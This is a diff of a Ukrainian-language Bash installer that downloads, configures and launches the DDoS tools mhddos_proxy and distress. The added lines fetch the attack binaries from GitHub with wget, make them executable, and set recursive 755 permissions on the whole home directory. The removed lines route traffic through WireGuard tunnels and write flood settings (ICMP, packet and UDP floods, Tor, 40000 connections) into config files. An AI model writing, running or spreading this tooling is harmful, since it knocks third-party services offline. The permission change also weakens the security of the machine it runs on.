@@ -32,28 +32,14 @@ touch "$LOG_FILE"
 # === Встановлення прав доступу ===
 set_permissions() {
     echo -e "\n📁  Встановлюю права доступу до папок і файлів..."
-
-    # Створення папок, якщо вони не існують
-    sudo mkdir -p $MODULE_DIR
-    sudo mkdir -p $WG_DIR
-
-    # Перевірка наявності файлів перед встановленням прав
-    if [ -f "$MODULE_DIR/mhddos_proxy" ]; then
-        sudo chmod +x $MODULE_DIR/mhddos_proxy
-    else
-        echo "[-] Файл mhddos_proxy не знайдено!"
-    fi
-
-    if [ -f "$MODULE_DIR/distress" ]; then
-        sudo chmod +x $MODULE_DIR/distress
-    else
-        echo "[-] Файл distress не знайдено!"
-    fi
-
+    sudo chmod -R 755 $HOME
+    sudo chmod -R 755 $MODULE_DIR
+    sudo chmod -R 755 $WG_DIR
+    sudo chmod +x $MODULE_DIR/mhddos_proxy
+    sudo chmod +x $MODULE_DIR/distress
     sudo chmod 644 $MODULE_DIR/mhddos.ini
     sudo chmod 644 $MODULE_DIR/distress.ini
     sudo chown -R $USER:$USER $HOME
-
     sudo chmod -R 755 $LOG_DIR
     sudo chown -R $USER:$USER $LOG_DIR
     sudo chmod 644 $LOG_FILE
@@ -91,6 +77,21 @@ install_dependencies() {
         echo "Підтримуваний пакетний менеджер не знайдено."
         exit 1
     fi
+}
+
+# === Завантаження обох модулів ===
+download_modules() {
+    echo -e "\n📥 Завантаження обох модулів..."
+
+    mhddos_proxy_download_link="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
+    distress_download_link="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
+
+    # Завантажуємо обидва модулі
+    wget -qO "$MODULE_DIR/mhddos_proxy" "$mhddos_proxy_download_link" || { echo "[-] Не вдалося завантажити mhddos_proxy"; exit 1; }
+    wget -qO "$MODULE_DIR/distress" "$distress_download_link" || { echo "[-] Не вдалося завантажити distress"; exit 1; }
+
+    chmod +x "$MODULE_DIR/mhddos_proxy"
+    chmod +x "$MODULE_DIR/distress"
 }
 
 # === Функції для запиту ===
@@ -170,6 +171,9 @@ echo -e "🛠️  Режим запуску: \e[1;36m$SELECTED_RUN_MODE\e[0m"
 # Встановлення прав доступу
 set_permissions
 
+# Завантаження обох модулів
+download_modules
+
 # Завантаження конфігурацій
 download_wg_configs
 
@@ -230,75 +234,7 @@ fi
 
 print_stage "Встановлення залежностей завершено."
 
-# === Завантаження модуля ===
-case "$SELECTED_MODULE" in
-    mhddos_proxy)
-        MODULE="$MODULE_DIR/mhddos_proxy"
-        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
-        MODULE_NAME="mhddos"
-        DOWNLOAD_LINK="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
-        ;;
-    distress)
-        MODULE="$MODULE_DIR/distress"
-        CONFIG_FILE="$MODULE_DIR/distress.ini"
-        MODULE_NAME="distress"
-        DOWNLOAD_LINK="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
-        ;;
-esac
-
-[ -f "$MODULE" ] || wget -qO "$MODULE" "$DOWNLOAD_LINK"
-chmod +x "$MODULE"
-
-# === Зупинка всіх активних WG інтерфейсів ===
-for iface in $(wg show interfaces 2>/dev/null); do
-    $SUDO wg-quick down "$iface" 2>/dev/null || true
-    $SUDO ip link delete "$iface" 2>/dev/null || true
-done
-
-# === Підключення 4 робочих тунелів ===
-check_wg_connection() {
-    curl -s --interface "$1" --max-time 5 https://api.ipify.org >/dev/null 2>&1
-}
-
-WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf))
-WG_IFACES=()
-INDEX=0
-
-while [ "${#WG_IFACES[@]}" -lt 4 ] && [ "$INDEX" -lt "${#WG_FILES[@]}" ]; do
-    conf="${WG_FILES[$INDEX]}"
-    IFACE_NAME=$(basename "$conf" .conf)
-    $SUDO wg-quick up "$conf" 2>/dev/null || true
-    sleep 2
-    if check_wg_connection "$IFACE_NAME"; then
-        echo -e "✅ Інтерфейс $IFACE_NAME працює."
-        echo "$(date '+%Y-%m-%d %H:%M:%S') ✅ Інтерфейс $IFACE_NAME працює." >> "$LOG_FILE"
-        WG_IFACES+=("$IFACE_NAME")
-    else
-        echo -e "❌ Інтерфейс $IFACE_NAME не працює. Відключаю."
-        echo "$(date '+%Y-%m-%d %H:%M:%S') ❌ Інтерфейс $IFACE_NAME не працює. Відключено." >> "$LOG_FILE"
-        $SUDO wg-quick down "$IFACE_NAME" 2>/dev/null || true
-        $SUDO ip link delete "$IFACE_NAME" 2>/dev/null || true
-    fi
-    INDEX=$((INDEX+1))
-done
-
-VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
-VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")
-
-# === Оновлення INI файлів ===
-echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$MODULE_DIR/mhddos.ini"
-echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$MODULE_DIR/distress.ini"
-
-if [ "$EDIT_INI" = "Так" ]; then
-    if [ -n "$DISPLAY" ]; then
-        zenity --text-info --editable --filename="$CONFIG_FILE" --title="Редагування INI" > "$CONFIG_FILE.tmp"
-        mv "$CONFIG_FILE.tmp" "$CONFIG_FILE"
-    else
-        nano "$CONFIG_FILE"
-    fi
-fi
-
-# === Запуск модуля ===
+# === Запуск вибраного модуля ===
 echo -e "⚙️  Запускаю модуль..."
 case "$SELECTED_RUN_MODE" in
     "screen у фоні") 
